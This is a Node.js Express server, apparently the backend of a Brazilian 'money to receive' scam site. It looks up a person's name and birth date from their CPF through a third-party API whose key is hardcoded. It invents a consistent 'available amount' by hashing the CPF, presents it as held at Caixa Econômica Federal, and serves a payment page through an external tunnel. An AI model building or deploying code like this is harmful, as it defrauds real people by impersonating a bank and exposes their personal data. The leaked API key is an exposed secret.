const express = require('express');
const path = require('path');
const cors = require('cors');

const app = express();

// Middlewares
app.use(cors());
app.use(express.static(__dirname));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Função para gerar data aleatória
function gerarDataAleatoria(anoMin, anoMax) {
  const ano = Math.floor(Math.random() * (anoMax - anoMin + 1) + anoMin);
  const mes = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
  const dia = String(Math.floor(Math.random() * 28) + 1).padStart(2, '0');
  return `${ano}-${mes}-${dia}`;
}

// Função para formatar data
function formatarData(dataStr) {
  if (!dataStr) return '---';
  const partes = dataStr.split('-');
  if (partes.length === 3) {
    return `${partes[2]}/${partes[1]}/${partes[0]}`;
  }
  return dataStr;
}


// Função para gerar valor aleatório baseado no CPF (sempre o mesmo para o mesmo CPF)
function gerarValorPorCPF(cpf) {
  // Usa o CPF como semente para gerar um número consistente
  let hash = 0;
  for (let i = 0; i < cpf.length; i++) {
    hash = ((hash << 5) - hash) + cpf.charCodeAt(i);
    hash = hash & hash;
  }
  // Gera um número entre 500 e 267889 (centavos)
  const min = 500;
  const max = 150000;   // R$ 1.500,00 (em centavos) ← ALTERADO
  const valorCentavos = min + (Math.abs(hash) % (max - min + 1));
  const valorReais = (valorCentavos / 100).toFixed(2);
  return parseFloat(valorReais);
}



// ====================== ROTA PARA BUSCAR CPF ======================
app.post('/buscar-cpf', async (req, res) => {
  const { cpf } = req.body;

  console.log(`🔍 Buscando CPF: ${cpf}`);

  if (!cpf || cpf.length !== 11) {
    return res.status(400).json({ 
      success: false, 
      erro: 'CPF inválido - deve conter 11 dígitos' 
    });
  }

  try {
    const fetch = await import('node-fetch');
    
    // Tenta chamar a API real
    const response = await fetch.default(`https://api.cpfhub.io/cpf/${cpf}`, {
      headers: {
        'x-api-key': 'f7c11a0558d9585472cbd78f071424a7e8a1cff213da92c06ec46de99ea82ae7',
        'Accept': 'application/json'
      },
      timeout: 5000
    });

    if (!response.ok) {
      throw new Error(`API retornou ${response.status}`);
    }

    const data = await response.json();
    
    // Extrair dados da API
    let nomeUsuario = '';
    let dataNascimentoReal = '';
    
    if (data.data && data.data.name) {
      nomeUsuario = data.data.name;
      if (data.data.birthDate) dataNascimentoReal = data.data.birthDate;
    } else if (data.name) {
      nomeUsuario = data.name;
    } else if (data.nome) {
      nomeUsuario = data.nome;
    }
    
    // Se não veio data de nascimento, gerar uma aleatória
    if (!dataNascimentoReal) {
      dataNascimentoReal = gerarDataAleatoria(1970, 2000);
    }
    
    // Gerar 3 opções de data (1 real + 2 aleatórias)
    const opcoesDatas = [
      dataNascimentoReal,
      gerarDataAleatoria(1960, 1990),
      gerarDataAleatoria(1980, 2010)
    ];
    
    // Embaralhar as opções
    for (let i = opcoesDatas.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
    }
    
    console.log(`✅ Dados encontrados: ${nomeUsuario}`);
    console.log(`📅 Data real: ${dataNascimentoReal}`);
    
    res.json({
      success: true,
      nome: nomeUsuario || 'Usuário encontrado',
      cpf: cpf,
      opcoesDatas: opcoesDatas,
      dataReal: dataNascimentoReal,
      valorDisponivel: gerarValorPorCPF(cpf),  // ← CORRIGIDO
      banco: 'CAIXA ECONÔMICA FEDERAL',
      agencia: '0001',
      conta: '*****-*',
      message: 'Dados obtidos com sucesso!'
    });

  } catch (err) {
    console.error('❌ Erro na API:', err.message);
    
    // Dados simulados para fallback
    const nomeSimulado = `Usuário CPF ${cpf.slice(0,3)}.${cpf.slice(3,6)}.${cpf.slice(6,9)}-${cpf.slice(9)}`;
    const dataReal = gerarDataAleatoria(1970, 2000);
    
    const opcoesDatas = [
      dataReal,
      gerarDataAleatoria(1960, 1990),
      gerarDataAleatoria(1980, 2010)
    ];
    
    // Embaralhar
    for (let i = opcoesDatas.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [opcoesDatas[i], opcoesDatas[j]] = [opcoesDatas[j], opcoesDatas[i]];
    }
    
    res.json({
      success: true,
      nome: nomeSimulado,
      cpf: cpf,
      opcoesDatas: opcoesDatas,
      dataReal: dataReal,
      valorDisponivel: gerarValorPorCPF(cpf),  // ← CORRIGIDO
      banco: 'CAIXA ECONÔMICA FEDERAL',
      agencia: '0001',
      conta: '12345-6',
      simulado: true,
      message: 'Dados simulados (API indisponível)'
    });
  }
});

// ====================== ROTAS HTML ======================
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/pagamento.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'pagamento.html'));
});

// ====================== FALLBACK ======================
app.use((req, res) => {
  res.status(404).send('Página não encontrada');
});

// ====================== INICIA O SERVIDOR ======================
const PORT = 3000;


app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Servidor rodando em http://localhost:${PORT}`);
  console.log(`📁 Pasta atual: ${__dirname}`);
  console.log(`🌐 Acesse: http://localhost:${PORT}\n`);
  console.log(`🚀 Tunnel ready! Seu app está disponível externamente.`);
});
